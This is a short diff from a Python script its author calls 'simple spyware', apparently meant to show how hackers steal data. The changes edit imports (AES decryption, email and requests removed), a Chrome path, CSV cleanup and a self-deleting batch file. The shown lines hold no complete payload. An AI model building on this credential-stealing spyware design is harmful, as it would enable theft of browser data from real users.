@@ -15,8 +15,6 @@ import subprocess
 from Crypto.Cipher import AES
 import shutil
 import csv
-from email.mime.multipart import MIMEMultipart
-import requests
 import time
 
 # get the chrome path from the user...
@@ -112,6 +110,6 @@ if __name__ == '__main__':
         os.remove("document.csv")
 
         # and running our .bat that deletes the spyware + itself...
-        os.startfile("Updater.bat")
+        #os.startfile("delete.bat")
 
 # This is our simple spyware written in python, now you know how can hackers fool u and steal your data...
